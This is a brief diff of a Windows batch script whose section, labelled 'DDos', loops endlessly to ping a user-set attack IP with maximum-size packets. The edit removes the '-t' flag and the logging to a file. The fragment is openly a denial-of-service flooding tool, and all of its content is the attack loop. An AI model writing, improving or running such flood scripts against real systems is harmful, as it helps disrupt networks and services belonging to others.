@@ -130,5 +130,5 @@ pause goto DDos
 
 :DDos
 :loop
-ping %AttackIP% -l 65500 -t -w 1 -n 1 >> log.txt
+ping %AttackIP% -l 65500 -w 1 -n 1 
 goto :loop
